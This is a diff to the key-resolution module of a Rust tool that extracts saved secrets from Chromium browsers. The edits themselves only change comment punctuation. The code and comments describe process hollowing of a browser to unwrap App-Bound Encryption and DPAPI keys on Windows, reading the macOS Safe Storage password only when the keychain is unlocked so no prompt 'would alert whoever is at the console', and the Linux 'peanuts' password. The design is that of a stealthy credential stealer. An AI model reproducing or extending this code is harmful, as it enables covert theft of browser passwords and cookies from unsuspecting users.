@@ -7,7 +7,7 @@
 //! |          | browser instance running this binary's image (see                  |
 //! |          | `crate::win32`); this process never reads `Local State`.           |
 //! | macOS    | the "Safe Storage" password from the login Keychain (via the       |
-//! |          | `security` CLI — the sanctioned unprivileged interface) → PBKDF2,    |
+//! |          | `security` CLI, the sanctioned unprivileged interface) → PBKDF2,     |
 //! |          | read ONLY when the login keychain is already unlocked (checked via  |
 //! |          | the non-interactive `SecKeychainGetStatus`, see `crate::keychain`)  |
 //! | Linux    | the hardcoded "peanuts" password → PBKDF2, 1 iteration; keyring-    |
@@ -24,8 +24,8 @@ use crate::inventory::{Browser, Family};
 
 /// The outcome of a key-resolution attempt for one browser.
 pub struct KeyOutcome {
-    /// The resolved provider keys (empty when unavailable — extraction
-    /// continues counts-only).
+    /// The resolved provider keys. Empty when unavailable; extraction
+    /// continues counts-only.
     pub bag: KeyBag,
     /// Machine-ish status for the report: "abe", "dpapi", "keychain",
     /// "peanuts", "not-applicable: ...", "unavailable: ...", "error: ...".
@@ -63,7 +63,7 @@ fn resolve_chromium(_browser: &Browser) -> KeyOutcome {
     // On Windows, master-key resolution happens exclusively inside the
     // hollowed browser payload (see win32::proxy): the elevation service
     // unwraps the ABE key and DPAPI runs under the browser's identity. This
-    // process never reads `Local State` or calls DPAPI — no fallback exists.
+    // process never reads `Local State` or calls DPAPI; no fallback exists.
     // If anything ever lands here it gets a clear "not from this process"
     // rather than silently reading secrets from the wrong identity.
     KeyOutcome::unavailable("unavailable: key resolution runs inside the browser payload process")
@@ -75,7 +75,7 @@ fn resolve_chromium(browser: &Browser) -> KeyOutcome {
         return KeyOutcome::unavailable("unavailable: no Safe Storage service known");
     }
     // Check the login keychain's lock state BEFORE invoking `security
-    // find-generic-password` — on a locked keychain that command falls back
+    // find-generic-password`; on a locked keychain that command falls back
     // to the system Keychain Access unlock dialog, which would alert whoever
     // is at the console and hang the run. Treat "couldn't determine" as
     // "locked": skip rather than risk it.
@@ -83,7 +83,7 @@ fn resolve_chromium(browser: &Browser) -> KeyOutcome {
         Ok(true) => {}
         Ok(false) => {
             return KeyOutcome::unavailable(
-                "unavailable: login keychain is locked (not unlocking — would prompt)",
+                "unavailable: login keychain is locked (not unlocking: would prompt)",
             );
         }
         Err(err) => {
